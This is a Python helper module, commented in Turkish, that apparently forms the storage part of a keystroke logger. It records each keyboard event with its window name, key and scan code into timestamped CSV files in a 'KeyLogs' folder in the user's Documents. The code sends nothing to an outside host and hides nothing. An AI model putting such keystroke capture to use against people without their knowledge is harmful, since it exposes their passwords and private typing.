from datetime import datetime
from utils import yDebugger
import os, pandas

#############################################
#            EVRENSEL DEĞİŞKENLER           
#############################################

LOG_ACTIVE = True
LOG_DIR = os.path.join(os.environ['userprofile'], "Documents", "KeyLogs")
LOG_FILE = datetime.now().strftime('%d-%b-%Y-%H-%M-%S') + ".csv"

COLUMNS = [
    "UTC Time",
    "Boot Time",
    "MessageName",
    "Message",
    "Window",
    "WindowName",
    "Ascii",
    "Key",
    "KeyID",
    "ScanCode",
    "Extended",
    "Injected",
    "Alt",
    "Transition"
]

def init():
    global DATA_FRAME, CONTEXT_FILE
    DATA_FRAME = pandas.DataFrame(columns=COLUMNS)
    CONTEXT_FILE = openFile()

def regData(event):
    datas = [
        datetime.utcnow(),
        event.Time,
        event.MessageName,
        event.Message,
        event.Window,
        event.WindowName,
        event.Ascii,
        event.Key,
        event.KeyID,
        event.ScanCode,
        event.Extended,
        event.Injected,
        event.Alt,
        event.Transition
    ]

    assert len(COLUMNS) == len(datas), "Sütun ile veri sayısı aynı değil :("

    DATA_FRAME.loc[len(DATA_FRAME)] = datas
    yDebugger.debugInfo(datas)

def logDirectly():
    if LOG_ACTIVE:
        DATA_FRAME.to_csv(CONTEXT_FILE, header=CONTEXT_FILE.tell()==0)
        DATA_FRAME.drop(DATA_FRAME.index, inplace=True)
        CONTEXT_FILE.flush()
        yDebugger.debugDebug(f"'{CONTEXT_FILE.name}' dosyasına kaydedildi")

def logOnReach(limit):
    if len(DATA_FRAME) >= limit:
        logDirectly()

def openFile():
    if not LOG_ACTIVE:
        yDebugger.debugInfo("Dosyaya raporlama kapalı!")
        return

    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

    return open(os.path.join(LOG_DIR, LOG_FILE), "a+", encoding="utf-8")


if __name__ == "__main__":
    print("Yardımcı modüldür, direkt olarak kullanılamaz")
else:
    init()
